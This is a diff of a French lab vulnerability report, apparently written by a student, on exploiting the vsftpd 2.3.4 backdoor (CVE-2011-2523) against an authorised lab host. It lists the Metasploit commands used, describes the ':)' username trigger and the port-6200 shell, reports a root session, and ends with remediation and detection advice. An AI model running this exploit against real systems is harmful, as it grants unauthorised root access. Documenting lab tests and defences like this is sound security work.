@@ -1,75 +1,105 @@
 # Fiche Vulnérabilité N°01 — FTP (vsftpd 2.3.4)
 
 ## 1. Contexte et Identification
-- **Service cible** : FTP (vsftpd)
-- **Port d'écoute** : `21/tcp`
-- **Version détectée** : `vsftpd 2.3.4`
-- **Référence CVE** : `CVE-2011-2523`
-- **Score CVSS v3** : `9.8 (Critique)` — Vecteur : `CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
-- **Cible autorisée** : ESGIS VulnBox (`10.1.0.1`)
+
+| **Champ** | **Valeur** |
+|---|---|
+| **Service cible** | FTP (vsftpd) |
+| **Port d'écoute** | `21/tcp` |
+| **Version détectée** | `vsftpd 2.3.4` |
+| **Référence CVE** | `CVE-2011-2523` |
+| **Score CVSS v3** | `9.8 (Critique)` |
+| **Vecteur CVSS** | `CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
+| **Cible autorisée** | ESGIS VulnBox (`10.1.0.1`) |
 
 ---
 
 ## 2. Démarche Méthodologique & Observations
 
 ### A. Détection initiale (Nmap)
-Le scan réseau des versions (`reports/nmap-services.txt`) a mis en évidence le service suivant sur le port standard :
+
+Le scan de détection des services et de leurs versions (`reports/nmap-services.txt`) a mis en évidence le service suivant sur le port standard :
+
 ```text
 PORT    STATE SERVICE VERSION
 21/tcp  open  ftp     vsftpd 2.3.4
 ```
 
 ### B. Recherche du module sous Metasploit
-Conformément aux bonnes pratiques, la recherche du module correspondant a été effectuée directement dans `msfconsole` :
+
+La recherche du module correspondant a été effectuée directement dans `msfconsole` :
+
 ```text
-msf6 > search vsftpd 2.3.4
+msf > search vsftpd 2.3.4
 
 Matching Modules
 ================
+
    #  Name                                  Disclosure Date  Rank       Check  Description
    -  ----                                  ---------------  ----       -----  -----------
    0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
 ```
 
 ### C. Analyse technique du module (`info`)
-La commande `info exploit/unix/ftp/vsftpd_234_backdoor` détaille l'origine de la faille :
-- **Historique** : Entre le 30 juin et le 3 juillet 2011, l'archive officielle `vsftpd-2.3.4.tar.gz` sur le serveur maître a été compromise par l'ajout d'une porte dérobée (*backdoor*).
-- **Fonctionnement** : Lorsqu'un client FTP transmet un identifiant se terminant par le motif `:)` (ex: `user toto:)`), le code malveillant déclenche l'ouverture d'une écoute shell interactive sur le port TCP `6200`.
+
+La consultation des informations du module `exploit/unix/ftp/vsftpd_234_backdoor` permet de comprendre l'origine de la vulnérabilité :
+
+- **Historique :** Entre le 30 juin et le 3 juillet 2011, l'archive officielle `vsftpd-2.3.4.tar.gz` hébergée sur le serveur maître a été compromise par l'ajout d'une porte dérobée (*backdoor*).
+- **Fonctionnement :** La version compromise contient un mécanisme malveillant qui se déclenche lorsqu'un identifiant FTP se termine par le motif `:)`. Ce mécanisme peut provoquer l'ouverture d'un accès shell sur le port TCP `6200`.
 
 ### D. Chargement, configuration et exécution
+
+Le module Metasploit identifié a été sélectionné et configuré pour l'environnement de laboratoire autorisé.
+
 ```text
-msf6 > use 0
-msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 10.1.0.1
-msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set LHOST 10.1.0.6
-msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run
+msf > use 0
+msf exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 10.1.0.1
+msf exploit(unix/ftp/vsftpd_234_backdoor) > set LHOST 10.1.0.6
+msf exploit(unix/ftp/vsftpd_234_backdoor) > show options
+msf exploit(unix/ftp/vsftpd_234_backdoor) > run
 ```
 
 ---
 
 ## 3. Preuves Réelles
 
-### Capture d'écran 1 — Configuration des options dans Metasploit
-![Configuration du module vsftpd 2.3.4](../../screenshots/04-vulnerabilites/01-vsftpd-options.png)
+### 3.1 Configuration des options dans Metasploit
 
-### Capture d'écran 2 — Preuve technique / Session interactive (PoC)
-![Preuve de concept vsftpd](../../screenshots/05-resultats/01-vsftpd-session-root.png)
+![- **Capture d'écran :**](../../screenshots/04-vulnerabilites/01-vsftpd-options.png)
 
-### Résultat technique observé :
+### 3.2 Preuve technique — Session interactive (PoC)
+
+![- **Capture d'écran :**](../../screenshots/05-resultats/01-vsftpd-session-root.png)
+
+### 3.3 Résultat technique observé
+
+Les observations réalisées dans l'environnement de laboratoire sont les suivantes :
+
 - Déclenchement réussi de la porte dérobée sur la cible autorisée `10.1.0.1`.
 - Obtention d'une session interactive avec les privilèges maximaux du système (`uid=0(root)`).
-- Intégrité et disponibilité de l'hôte vérifiées via `sysinfo` / `id`.
+- Informations système et identité du compte vérifiées à l'aide des éléments de preuve `sysinfo` et `id`.
 
 ---
 
 ## 4. Mesures Correctives et Remédiation
 
-- **Mise à jour logicielle prioritaire** : Remplacer immédiatement `vsftpd 2.3.4` par une version maintenue exempte de porte dérobée.
-- **Contrôle d'intégrité de la chaîne d'approvisionnement (Supply Chain)** : Valider systématiquement les condensats cryptographiques (SHA-256) et les signatures numériques (GPG) des paquets avant tout déploiement en production.
-- **Principe de moindre privilège** : Si l'accès FTP anonyme n'est pas indispensable, désactiver le service au profit de protocoles chiffrés et authentifiés (SFTP via OpenSSH).
-- **Filtrage défensif (Pare-feu & IDS)** :
+- **Mise à jour logicielle prioritaire :** Remplacer immédiatement `vsftpd 2.3.4` par une version saine, maintenue et provenant d'une source officielle vérifiée.
+
+- **Contrôle d'intégrité de la chaîne d'approvisionnement (Supply Chain) :** Vérifier systématiquement les condensats cryptographiques (SHA-256) et les signatures numériques (GPG) des paquets avant leur déploiement en production.
+
+- **Principe du moindre privilège :** Désactiver le service FTP lorsqu'il n'est pas indispensable. Privilégier des protocoles chiffrés et authentifiés, tels que SFTP via OpenSSH.
+
+- **Filtrage défensif (Pare-feu & IDS) :**
   - Restreindre l'accès au port `21/tcp` aux seuls réseaux d'administration autorisés.
-  - Bloquer impérativement tout flux sortant ou entrant vers le port TCP `6200`.
-  - Configurer une règle de détection réseau (Snort/Suricata) identifiant la séquence caractéristique `:)` dans les trames d'authentification FTP.
+  - Examiner et filtrer les communications inhabituelles associées au port TCP `6200`.
+  - Configurer une détection réseau avec Snort ou Suricata pour identifier les comportements caractéristiques de la porte dérobée dans les échanges FTP.
 
 ---
-**Statut actuel** : ✅ **Validé, testé et documenté avec succès**
+
+## 5. Conclusion
+
+Le test réalisé sur l'environnement autorisé ESGIS VulnBox a permis de confirmer la présence de la porte dérobée associée à `vsftpd 2.3.4` et d'obtenir une session interactive avec les privilèges `root`.
+
+Cette vulnérabilité représente un risque majeur pour la confidentialité, l'intégrité et la disponibilité du système. Elle souligne également l'importance de vérifier l'intégrité des logiciels avant leur installation.
+
+**Statut :** Validé — Test réalisé, preuve de session interactive obtenue et documentation établie.
